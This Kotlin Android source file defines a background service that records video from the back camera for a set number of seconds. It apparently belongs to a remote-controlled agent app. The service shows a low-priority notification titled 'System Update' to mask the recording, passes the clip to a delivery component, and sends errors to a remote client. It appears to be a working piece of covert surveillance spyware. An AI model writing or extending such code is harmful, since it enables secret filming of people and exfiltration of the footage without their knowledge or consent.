package ai.obsidian.agent.svc

import ai.obsidian.agent.AgentApp
import ai.obsidian.agent.media.MediaSink
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import androidx.camera.core.CameraSelector
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.camera.video.FileOutputOptions
import androidx.camera.video.Quality
import androidx.camera.video.QualitySelector
import androidx.camera.video.Recorder
import androidx.camera.video.Recording
import androidx.camera.video.VideoCapture
import androidx.camera.video.VideoRecordEvent
import androidx.core.content.ContextCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File

class ClipService : Service() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
    private lateinit var app: AgentApp
    private var recording: Recording? = null

    override fun onCreate() {
        super.onCreate()
        app = application as AgentApp
        val manager = getSystemService(NotificationManager::class.java)
        if (manager.getNotificationChannel(CHANNEL_ID) == null) {
            manager.createNotificationChannel(
                NotificationChannel(CHANNEL_ID, "Clip", NotificationManager.IMPORTANCE_MIN)
            )
        }
        startForeground(NOTIFICATION_ID, buildNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val seconds = (intent?.getIntExtra("seconds", 10) ?: 10).coerceIn(2, 120)
        scope.launch { record(seconds) }
        return START_NOT_STICKY
    }

    private suspend fun record(seconds: Int) {
        try {
            val provider = ProcessCameraProvider.getInstance(this).get()
            val capture = VideoCapture.withOutput(
                Recorder.Builder().setQualitySelector(QualitySelector.from(Quality.HD)).build()
            )
            provider.unbindAll()
            provider.bindToLifecycle(this as androidx.lifecycle.LifecycleOwner, CameraSelector.DEFAULT_BACK_CAMERA, capture)

            val file = app.store.file("clip_${System.currentTimeMillis()}.mp4")
            val output = FileOutputOptions.Builder(file).build()

            recording = capture.output.prepareRecording(this, output).start(ContextCompat.getMainExecutor(this)) { event ->
                if (event is VideoRecordEvent.Finalize) {
                    scope.launch {
                        MediaSink.deliverFile(app, file, "clip")
                        stopSelf()
                    }
                }
            }

            delay(seconds * 1000L)
            recording?.stop()
        } catch (throwable: Throwable) {
            app.audit.warn("clip", throwable.message.orEmpty())
            app.client?.let { client -> scope.launch { client.send("msg", "CLIP_ERR ${throwable.message}") } }
            stopSelf()
        }
    }

    private fun buildNotification(): Notification =
        Notification.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setContentTitle("System Update")
            .setContentText("Recording clip")
            .build()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        recording?.close()
        scope.cancel()
        super.onDestroy()
    }

    companion object {
        private const val CHANNEL_ID = "obsidian.clip"
        private const val NOTIFICATION_ID = 0x0B51D1D
    }
}
